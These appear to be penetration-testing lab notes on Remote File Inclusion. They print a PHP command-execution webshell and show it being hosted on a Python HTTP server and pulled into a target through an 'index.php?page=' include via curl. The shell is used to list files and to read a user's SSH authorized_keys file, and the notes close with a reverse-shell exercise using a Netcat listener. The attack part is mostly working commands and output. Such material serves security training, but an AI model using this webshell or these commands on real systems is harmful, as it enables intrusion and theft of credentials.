# Remote File Inclusion (RFI)

Location and contents of the simple-backdoor.php webshell
>``` shell
>kali@kali:~$ cat simple-backdoor.php
>
># ========== Expected Result ==========
>...
><?php
>if(isset($_REQUEST['cmd'])){
>        echo "<pre>";
>        $cmd = ($_REQUEST['cmd']);
>        system($cmd);
>        echo "</pre>";
>        die;
>}
>?>
>
>Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
>...
># =====================================
>```

Starting the Python3 http.server module
>``` shell
>kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>```

Exploiting RFI with a PHP backdoor and execution of ls
>``` shell
>kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
><!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
>
><pre>admin.php
>bavarian.php
>css
>fonts
>img
>index.php
>js
></pre>  
># =====================================
>```

Lab 1 - Follow the steps from this section to leverage the RFI on port 80 to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.
>``` shell
>#Starting the Python3 http.server module
>kali@kali:~$ cd /usr/share/webshells/php/
>
>kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
>
># Exploiting RFI with a PHP backdoor
>kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.217/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
>
>># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
><!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
>
><pre>command = "OS{c500f0c6172c1898971122cf433ee3a3}" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOMAXqYDrvKuG0L+G20mS7ARlXSBnLd8sxCXCB2V/CHDftnyxwQMqkc7B14GncT4dUzd1iRmrxczF6ED45Yl8lhRXwJxDOtXLYInwA/9KVgFU5ncDdooIgWe//5HW0yZDBCsKiw2IpoxfGskRMeUufiPW7x+pG/RL6wbf3YLila1cT1o/XTuESVX8DFWQEa5Lq21F7LDmoEGfUQFqf33bWA5Cy4KrUfWmiSZrlC0y2nk6qJVIDJHAmhReM2DRYjNyxKb/B5kNE7yj94kh9EmYWffAN/rlFk1JWk7gCjClp/fdpsTIANFFsyfZ0ADMpknYURWY4Urjlm7XZ+OTjx+Sn4gnQq8+/wPi4ypqKL403OMecFGhnsvI20Pefq+c44K+R52igJAEQA7z3Jv74lPUO5F9PVXyOg6N46e2j/3UCyfYKaJncfB0Zc55BU1nQKFS2SjjTvTAD7Lhg0F1q0HKbM4z12ph8OzzzMvLoOYwujt/etKXm9qMLOwMcgfA+R0k= elaine@tri-island
></pre>
># =====================================
>```
>OS{c500f0c6172c1898971122cf433ee3a3}

Lab 2 - Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey's Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on port 8001 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.
>``` shell
>
>```
>
